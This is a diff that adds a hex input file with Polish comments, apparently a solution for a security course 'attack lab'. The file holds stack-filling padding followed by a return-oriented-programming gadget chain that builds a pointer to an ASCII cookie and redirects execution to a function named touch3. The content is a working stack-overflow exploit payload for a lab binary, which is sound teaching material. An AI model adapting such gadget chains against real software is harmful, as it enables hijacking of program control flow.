@@ -1,0 +1,24 @@
+/* nastepna linie nie koduje niczego, sluzy jedynie do zapelnienia stosu, aby moc zmienic adres powrotu */
+ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
+/* zmiana adresu powrotu na gadzet pop %rax z ret (podobnie bedzie z nastpenymi gadzetami) */
+b7 19 40 00 00 00 00 00
+/* przesuniecie adresu */
+20 00 00 00 00 00 00 00
+/* mov %eax, %ecx */
+0e 1a 40 00 00 00 00 00
+/* mov %ecx, %edc */
+76 1a 40 00 00 00 00 00
+/* mov %edx, %esi */
+5a 1a 40 00 00 00 00 00
+/* mov %rsp, %rax wyciagniecie %rsp */
+a5 1a 40 00 00 00 00 00
+/* mov %rax, %rdi */
+d5 19 40 00 00 00 00 00
+/* leaq (%rdi,%rsi,1),  %rax dodanie do starego wskaznika przesuniecia, aby wskazywal na ciasteczko w kodzie ascii */
+e0 19 40 00 00 00 00 00
+/* mov %rax, %rdi */
+d5 19 40 00 00 00 00 00
+/* adres powrotu do funkcji touch3 */
+11 19 40 00 00 00 00 00
+/* ciasteczko zapisane w kodzie ascii */
+32 37 30 35 38 65 38 38 00
